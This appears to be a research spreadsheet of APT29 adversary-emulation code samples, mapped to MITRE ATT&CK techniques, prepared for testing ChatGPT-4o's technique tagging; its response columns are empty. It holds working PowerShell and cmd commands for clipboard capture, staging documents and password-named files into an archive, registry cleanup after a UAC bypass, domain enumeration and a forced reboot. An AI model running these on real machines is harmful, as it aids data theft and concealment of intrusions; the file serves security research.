Group,Code-sample-name,technique,tactic,Code-sample,Description specific to Code-sample (from emulation-plans),Additional Notes on Group classification,"Technique is in ""Technique-knowledge-file--80.json""?",ChatGPT-4.o Response (WITHOUT knowledge-file),ChatGPT-4.o Response (WITH knowledge-file),Tagging result (WITHOUT knowledge-file),Tagging result (WITH knowledge-file),Analysis (comparison with & w/o knowledge-file)
Group 1:        Self sufficient,apt29/collection--T1115  Clipboard Data--windows,T1115: Clipboard Data,collection,"$clip_data=get-clipboard;
if ($clip_data.Length -gt 0) {
  write-host ""[+] Clipboard data obtained!\n"";
  write-host $clip_data;
} else {
  write-host ""[!] No clipboard data available!\n"";
}","- id: ee4c2eab-be57-434c-a32c-14b77360301a
  name: Automated Collection (T1119) - Clipboard (T1115)
  description: Get contents of clipboard",,,,,,,
Group 1:        Self sufficient,apt29/collection--T1119: Automated Collection--windows,T1119: Automated Collection,collection,"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force","- id: 5692da31-3586-4e4f-8f07-5750070c730b
  name: Automated Collection
  description: Execute PowerShell from cmd.exe to collect and compress files of specific extensions.",,,,,,,
Group 1:        Self sufficient,apt29/defensive-evasion--T1112  Modify Registry--windows,T1112: Modify Registry,defense-evasion,"Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
if (!(test-path -path HKCU:\Software\Classes\Folder)) {
  write-host ""[+] Reg keys removed!"";
 }","- id: 5ff80022-8d85-410b-b868-6c7565b267e5
  name: Registry Cleanup for UAC Bypass Technique
  description: Delete registry entries post-UAC bypass.",이것도 Exeternally-dependent에 가야하나? ,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1007  System Service Discovery--windows,T1007: System Service Discovery,discovery,net start,"- id: 144b1384-5060-494f-80eb-91772695cdf3
  name: System Service Discovery
  description: The net utility is executed via cmd to enumerate local active services.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1012  Query Registry--windows,T1012: Query Registry,discovery,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,"- id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a
  name: Query Registry
  description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1016: System Network Configuration Discovery--windows,T1016: System Network Configuration Discovery,discovery,netsh advfirewall show allprofiles,"- id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
  name: System Network Configuration Discovery
  description: The netsh utility is executed via cmd to enumerate local firewall configuration information.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1049  System Network Connections Discovery--windows,T1049: System Network Connections Discovery,discovery,netstat -ano,"- id: ba0b398d-91b8-490a-bed2-f959afa8e1aa
  name: 4.C.2 - System Network Connections Discovery (T1049)
  description: The netstat utility is executed via cmd to enumerate local active network connections.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1069  Permission Groups Discovery--windows,T1069: Permission Groups Discovery,discovery,"cmd.exe /c net group ""Domain Admins"" /domain","- id: 84377d7a-0363-44fd-a082-44657ca1858f
  name: Permissions Groups Discovery
  description: The net utility is executed via cmd to enumerate members of the domain administrators group.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1083  File and Directory Discovery--windows,T1083: File and Directory Discovery,discovery,ls 192.0.2.20,"- id: d5170a60-3bdc-44e0-9870-a38db5c0cf81
  name: File and Directory Discovery (T1083)
  description: PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.",,,,,,,
Group 1:        Self sufficient,apt29/discovery--T1087  Account Discovery--windows,T1087: Account Discovery,discovery,net user %USERNAME% /domain,"- id: 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76
  name: Account Discovery
  description: The net utility is executed via cmd to enumerate detailed information about a specific user account.",,,,,,,
Group 1:        Self sufficient,"apt29/impact--T1529  System Shutdown,Reboot--windows","T1529: System Shutdown,Reboot",impact,"write-host ""[*] Restarting Computer"";
Restart-Computer -Force;","- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
  name: Scheduled Task
  description: Reboot the machine to aid in peristence callbacks",이것도 Exeternally-dependent에 가야하나? ,,,,,,
